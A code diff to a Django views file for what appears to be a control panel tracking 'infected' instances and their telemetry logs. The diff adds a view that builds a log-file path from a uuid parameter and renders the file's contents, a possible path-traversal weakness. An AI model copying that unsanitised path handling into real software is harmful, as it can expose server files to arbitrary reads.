@@ -7,6 +7,7 @@ from django.db.models import Sum
 from django.conf import settings
 
 import os
+from pathlib import Path
 
 # Create your views here.
 from api.models import Instancia, Telemetria
@@ -55,7 +56,7 @@ def user_control_instance(request: HttpRequest, infectado):
     return render(request, "web/user_control_instance.html", {"infectado": infectado})
 
 @login_required
-def telemetry(request: HttpRequest):
+def telemetry(request: HttpRequest, uuid = None):
     if request.GET.get("download"):
         file = request.GET.get("download")
         archivo = Telemetria.objects.get(uuid=file)
@@ -73,5 +74,12 @@ def telemetry(request: HttpRequest):
         messages.success(request, f"Telemetry file <b>{archivo.filename}</b> deleted successfully!")
         archivo.delete()
         return redirect('web:telemetry')
+    if uuid:
+        try:
+            registro = Path(f"{settings.BOROCITO_TELEMETRY_DIR}/{uuid}.log").read_text(encoding="utf-8")
+        except Exception as ex:
+            registro = str(ex)
+        return render(request, "web/telemetry_logs.html", {"registro": registro})
     archivos = Telemetria.objects.all()
-    return render(request, "web/telemetry.html", {"archivos": archivos})
+    telemetrias = Instancia.objects.all()
+    return render(request, "web/telemetry.html", {"archivos": archivos, "telemetrias": telemetrias})
